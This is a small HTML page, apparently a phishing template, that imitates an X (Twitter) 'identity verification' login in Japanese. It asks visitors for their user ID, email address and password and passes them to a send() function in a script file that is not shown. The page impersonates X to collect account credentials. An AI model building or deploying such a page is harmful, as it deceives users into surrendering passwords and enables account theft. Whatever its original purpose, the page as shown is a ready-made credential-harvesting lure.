<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" type="text/css" href="style.css">
    <title>X(Twitter) 認証</title>
    <script src="script.js"></script>
</head>
<body>
    <div class="centered">
        <h1>【本人確認用】</h1>
        <h3>X / ツイッターアカウントでログインしてください</h3>
    </div>
    <br>
    <div style="text-align: center;">
    <label for="name">ユーザーID</label>
    <input type="text" id="name" name="name" placeholder="ユーザーIDを入力してください" required><br>
    
    <label for="email">メールアドレス：</label>
    <input type="email" id="email" name="email" placeholder="メールアドレスを入力してください" required><br>
    
    <label for="password">パスワード：</label>
    <input type="password" id="password" name="password" placeholder="パスワードを入力してください" required><br>
    
    <button type="button" onclick="send()">送信</button>
    <br>
    <br>
    結果
    <br>
    <input type="text" id="myTextbox" readonly>
    </div>
    
</body>
</html>
